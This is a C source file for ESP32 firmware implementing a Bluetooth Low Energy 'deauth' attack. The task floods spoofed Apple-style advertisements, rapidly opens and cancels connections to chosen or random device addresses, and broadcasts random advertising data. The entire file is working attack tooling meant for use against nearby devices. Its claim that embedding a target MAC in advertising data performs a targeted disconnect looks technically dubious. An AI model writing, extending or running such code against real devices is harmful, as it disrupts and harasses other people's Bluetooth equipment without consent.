/**
 * @file attack_bt_deauth.c
 * @brief BT Deauth Attack - BLE disconnect / connection flood
 * Reuses NimBLE host if already initialized by BT Spam.
 */

#include "attack_bt_deauth.h"
#include "attack_bt_spam.h"
#include <string.h>
#include <stdlib.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "host/ble_gap.h"
#include "host/ble_hs.h"
#include "nimble/ble.h"

static const char *TAG = "attack_bt_deauth";

static bool running = false;
static TaskHandle_t task_handle = NULL;
static SemaphoreHandle_t task_exit_sem = NULL;

static void deauth_task(void *arg){
    bt_deauth_config_t *c = (bt_deauth_config_t*)arg;
    uint32_t count = 0;
    ESP_LOGI(TAG, "BT DEAUTH STARTED method=%d targets=%d all=%d", c->method, c->target_count, c->all_devices);
    while(running){
        uint8_t target_mac[6];
        bool use_specific = (c->target_count>0 && !c->all_devices);
        if(use_specific){
            int idx = count % c->target_count;
            memcpy(target_mac, c->targets[idx], 6);
        } else {
            esp_fill_random(target_mac, 6);
            target_mac[5] |= 0xC0;
        }

        uint8_t adv[31];
        size_t len = 0;
        if(c->method == 0){
            adv[len++] = 0x02; adv[len++] = 0x01; adv[len++] = 0x06;
            adv[len++] = 0x07; adv[len++] = 0xFF; adv[len++] = 0x4C; adv[len++] = 0x00; adv[len++] = 0x0C; adv[len++] = 0x0E; adv[len++] = 0x00; adv[len++] = 0x00;
            if(use_specific){
                // embed target mac in payload for targeted deauth
                adv[len++] = 6; adv[len++] = 0xFF; memcpy(&adv[len], target_mac, 6); len+=6;
            }
        } else if(c->method == 1){
            ble_addr_t addr = { .type = BLE_ADDR_RANDOM, };
            memcpy(addr.val, target_mac, 6);
            int rc = ble_gap_connect(BLE_OWN_ADDR_RANDOM, &addr, 800, NULL, NULL, NULL);
            if(rc == 0){
                vTaskDelay(pdMS_TO_TICKS(60));
                // cancel pending connect - handle 0 is invalid, use conn_cancel
                ble_gap_conn_cancel();
            } else if(rc == BLE_HS_EALREADY){
                ble_gap_conn_cancel();
                vTaskDelay(pdMS_TO_TICKS(20));
            }
        } else {
            if(use_specific){
                adv[0]=7; adv[1]=0xFF; memcpy(&adv[2], target_mac, 6); len=8;
            } else {
                esp_fill_random(adv, 15);
                len = 15;
                adv[0] = 14; adv[1] = 0xFF;
            }
        }

        if(len > 0 && c->method != 1){
            ble_gap_adv_stop();
            vTaskDelay(pdMS_TO_TICKS(5));
            struct ble_gap_adv_params p = {0};
            p.conn_mode = BLE_GAP_CONN_MODE_NON;
            p.disc_mode = BLE_GAP_DISC_MODE_GEN;
            p.itvl_min = 0x20; p.itvl_max = 0x30; p.channel_map = 0x07;
            ble_gap_adv_set_data(adv, len);
            ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, 80, &p, NULL, NULL);
            vTaskDelay(pdMS_TO_TICKS(80));
            ble_gap_adv_stop();
        }

        count++;
        if(count % 30 == 0) ESP_LOGI(TAG, "BT Deauth packets: %lu", count);
        vTaskDelay(pdMS_TO_TICKS(20 + (esp_random() % 30)));
    }
    ESP_LOGI(TAG, "BT DEAUTH STOPPED total %lu", count);
    running = false;
    task_handle = NULL;
    if(task_exit_sem) xSemaphoreGive(task_exit_sem);
    vTaskDelete(NULL);
}

void attack_bt_deauth_init(void){
    if(task_exit_sem == NULL) task_exit_sem = xSemaphoreCreateBinary();
    // Ensure NimBLE host running - reuse BT Spam init if needed
    if(!ble_hs_synced()){
        ESP_LOGI(TAG, "NimBLE not synced, initializing via spam init");
        attack_bt_spam_init();
        int t=50;
        while(!ble_hs_synced() && t-- >0) vTaskDelay(pdMS_TO_TICKS(100));
    }
    if(!ble_hs_synced()){
        ESP_LOGW(TAG, "NimBLE still not synced, deauth may be unstable");
    } else {
        ESP_LOGI(TAG, "BT Deauth init ok, host synced");
    }
}

void attack_bt_deauth_start(bt_deauth_config_t *cfg){
    if(running){
        ESP_LOGW(TAG, "Already running");
        return;
    }
    if(!cfg){
        ESP_LOGE(TAG, "Null cfg");
        return;
    }
    if(task_exit_sem) xSemaphoreTake(task_exit_sem, 0);
    running = true;
    static bt_deauth_config_t scfg;
    memcpy(&scfg, cfg, sizeof(scfg));
    BaseType_t r = xTaskCreate(deauth_task, "bt_deauth", 4096, &scfg, 5, &task_handle);
    if(r != pdPASS){
        ESP_LOGE(TAG, "Task create failed");
        running=false;
    }
}

void attack_bt_deauth_stop(void){
    if(!running && task_handle==NULL) return;
    running=false;
    if(task_exit_sem){
        if(xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(3000)) != pdTRUE){
            ESP_LOGW(TAG, "Deauth exit timeout");
            if(task_handle) { vTaskDelete(task_handle); task_handle=NULL; }
        }
    } else {
        vTaskDelay(pdMS_TO_TICKS(300));
        if(task_handle){ vTaskDelete(task_handle); task_handle=NULL; }
    }
    ble_gap_adv_stop();
    ESP_LOGI(TAG, "BT Deauth stopped");
}

bool attack_bt_deauth_is_running(void){ return running; }
